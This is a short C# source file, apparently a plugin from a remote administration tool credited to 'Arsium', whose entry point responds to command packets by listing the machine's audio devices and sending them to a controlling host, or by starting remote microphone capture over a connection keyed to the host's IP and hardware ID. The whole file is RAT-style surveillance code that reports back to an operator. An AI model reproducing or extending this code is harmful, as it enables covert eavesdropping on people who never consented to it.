using PacketLib;
using PacketLib.Packet;
using System.Threading;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        internal static ClientHandler clientHandler;
        internal static bool audioCapture;

        internal static RemoteAudioCapturePacket remoteAudioCapturePacket;
        public static void Main(LoadingAPI loadingAPI)
        {
            audioCapture = false;

            switch (loadingAPI.CurrentPacket.PacketType) 
            {
                case PacketType.AUDIO_GET_DEVICES:
                    ClientHandler clientHandlerGetAudioDevices = new ClientHandler(loadingAPI.Host, loadingAPI.Key, loadingAPI.BaseIp, loadingAPI.HWID);
                    clientHandlerGetAudioDevices.ConnectStart();
                    RemoteAudioPacket remoteAudioPacket = new RemoteAudioPacket(GetDevices.GetAudioDevices(), loadingAPI.BaseIp, loadingAPI.HWID);
                    while (!clientHandlerGetAudioDevices.Connected)
                        Thread.Sleep(125);
                    clientHandlerGetAudioDevices.SendPacket(remoteAudioPacket);
                    break;

                case PacketType.AUDIO_RECORD_ON:
                    audioCapture = true;
                    remoteAudioCapturePacket = (RemoteAudioCapturePacket)loadingAPI.CurrentPacket;
                    clientHandler = new ClientHandler(loadingAPI.Host, loadingAPI.Key, loadingAPI.BaseIp, loadingAPI.HWID);
                    clientHandler.ConnectStart();
                    break;

                default:
                    return;
            }
        }
    }
}
